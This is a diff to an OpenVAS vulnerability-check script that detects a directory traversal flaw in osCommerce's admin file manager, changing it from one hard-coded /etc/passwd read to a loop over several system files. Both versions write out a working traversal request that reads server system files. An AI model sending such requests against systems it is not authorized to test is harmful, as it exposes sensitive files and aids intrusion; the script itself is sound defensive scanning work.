@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: osCommerce_dirtraversal.nasl 10771 2018-08-04 15:18:29Z cfischer $
+# $Id: osCommerce_dirtraversal.nasl 11761 2018-10-05 10:25:32Z jschulte $
 #
 # osCommerce directory traversal
 #
@@ -29,8 +29,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.17595");
-  script_version("$Revision: 10771 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-04 17:18:29 +0200 (Sat, 04 Aug 2018) $");
+  script_version("$Revision: 11761 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-05 12:25:32 +0200 (Fri, 05 Oct 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_cve_id("CVE-2004-2021");
   script_bugtraq_id(10364);
@@ -40,7 +40,7 @@ if(description)
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2005 David Maciejak");
-  script_dependencies("oscommerce_detect.nasl");
+  script_dependencies("oscommerce_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("Software/osCommerce");
 
@@ -62,21 +62,29 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 CPE = 'cpe:/a:oscommerce:oscommerce';
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
-url = string(dir, "/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd");
-req = http_get(item:url, port:port);
-buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-if(isnull(buf)) exit(0);
+files = traversal_files();
 
-if(egrep(pattern:"root:0:[01]:.*", string:buf)){
-  report = report_vuln_url( port:port, url:url );
-  security_message(port:port, data:report);
-  exit(0);
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  url = string(dir, "/admin/file_manager.php?action=read&filename=../../../../../../../../" + file);
+  req = http_get(item:url, port:port);
+  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+  if(isnull(buf)) continue;
+
+  if(egrep(pattern:pattern, string:buf)){
+    report = report_vuln_url( port:port, url:url );
+    security_message(port:port, data:report);
+    exit(0);
+  }
 }
 
 exit(99);
